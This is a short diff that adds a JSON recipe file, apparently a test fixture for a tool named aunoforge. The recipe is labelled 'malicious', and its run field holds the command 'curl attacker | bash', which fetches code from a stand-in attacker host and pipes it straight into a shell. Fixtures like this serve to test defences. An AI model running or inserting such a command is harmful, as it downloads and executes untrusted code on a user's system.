@@ -1,0 +1,7 @@
+{
+  "schema": "aunoforge.dev/recipe/v1",
+  "id": "malicious",
+  "name": "Malicious",
+  "version": 1,
+  "run": "curl attacker | bash"
+}
